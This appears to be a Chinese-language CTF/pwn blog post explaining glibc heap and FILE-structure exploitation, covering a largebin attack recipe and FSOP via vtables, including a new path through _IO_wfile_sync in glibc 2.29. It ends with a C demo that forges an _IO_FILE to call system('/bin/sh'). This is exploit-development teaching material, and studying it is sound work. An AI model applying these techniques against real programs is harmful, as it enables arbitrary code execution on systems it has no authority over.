---
layout:     post   				    # 使用的布局（不需要改）
title:      Glibc 2.29下的IO_FILE利用 		 # 标题 
subtitle:   Glibc2.29               # 副标题
date:       2020-08-17 				# 时间
author:     Mr.R 					# 作者
# header-img: img/post-bg-2015.jpg 	# 这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								# 标签
    - CTF
    - Pwn
---

## Largebin Attack

2.31中加入了限制，先将小的chunk放入large bin的方法不可行了

![image-20200817003828537](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght4lafd2aj31bc0p87af.jpg)

但是现在仍然可以使用这个方法

![image-20200817004014478](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght4n4l9suj316u0aaq50.jpg)



具体用法:

```
chunk0 = malloc(0x450)#0
malloc(0x10)#1
chunk1 = malloc(0x420)#2
malloc(0x10)#3
free(chunk0)
malloc(0x600)		//将chunk0放入large bin

free(chunk1)		//将chunk1放入unsorted bin
chunk0->bk_nextsize = target-0x20

malloc(0x420)  //触发large bin attack
```

## FSOP

### glibc2.23

glibc2.23中只需要伪造vtable的地址即可

### glibc2.24+

glibc2.24中加入了vtable_check，导致无法伪造vtable地址，但是可以使用其他的vtable，常用的是_IO_str_jumps,

利用其中的OVERFLOW和FINISH来进行函数调用

### glibc2.29

#### 1.复写vtable

glibc2.23中我们伪造vtable是因为其不可写，但是在glibc2.29中，vtable是可写的

![image-20200817005301996](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght50g287lj315m03a3zd.jpg)

![image-20200817005319342](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght50qfk4bj31mg03iq3i.jpg)

因此可以直接覆写_IO_file_jumps

#### 2.利用其他vtable

有时候我们并不能做到任意地址覆写，也就无法去覆盖_IO_file_jumps，这时仍需要利用类似2.24+的方法



但是glibc2.29中，_IO_str_jumps中的OVERFLOW和FINISH均不可使用了，我们对比一下

##### 2.27:

![image-20200817005708646](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght54p8t0uj31bu0fotb8.jpg)

![image-20200817005807286](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght55qm4idj31m60my42c.jpg)

##### 2.29:

![image-20200817005545322](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght53aeuxqj316o0fcmza.jpg)

![image-20200817005621297](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght53xrrzej316a0ikgoy.jpg)

可以看到2.27中，free和malloc的位置都是由fp内部的函数指针决定的，因此可以通过伪造fp结构体来做到任意函数执行

但是在2.29中，这两处都被改为了free和malloc，也就是不能够再进行利用了。



经过一段时间的查找后，我发现_IO_wfile_jumps中仍包含有大量的函数指针，其中\_IO_wfile_sync函数较好利用

![image-20200817010304968](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght5awr692j31fg0u0dln.jpg)

![image-20200817010337407](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght5bh1qppj31bu0u0ai2.jpg)

仅需满足以下条件即可:

```
1.fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
2.fp->_wide_data->_IO_read_ptr - fp->_wide_data->_IO_read_end
3.*(fp->_codecvt+4)=func,参数就是fp->_codecvt
```

为了触发fsop，还需要满足fsop所要求的fp参数

demo:

```c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#define _IO_list_all 0x7ffff7fbc660
#define _IO_wfile_jumps 0x7ffff7fbd020

int main(){
    struct _IO_FILE *fp1 = malloc(0x500);
    size_t *fp2 = malloc(0x500);
    unsigned long func[10];
    memcpy(func,"/bin/sh\x00",8);
    func[4]=system;
    size_t *ptr = _IO_list_all;
    *ptr = fp1;
    fp1->_mode=0;
    fp1->_IO_write_ptr = 1;
    fp1->_IO_write_base = 0;
    *(unsigned long *)((unsigned long)fp1+0xd8) = _IO_wfile_jumps+8*9;
    fp1->_wide_data = fp2;
    fp1->_codecvt=func;
    fp2[4] = 0;
    fp2[3] = 1;
    fp2[0] = 1;
    fp2[1] = 0;
    exit(0);
    return 0;
}
```

![image-20200817013459090](https://tva1.sinaimg.cn/large/007S8ZIlgy1ght6834pnvj30yg05a75c.jpg)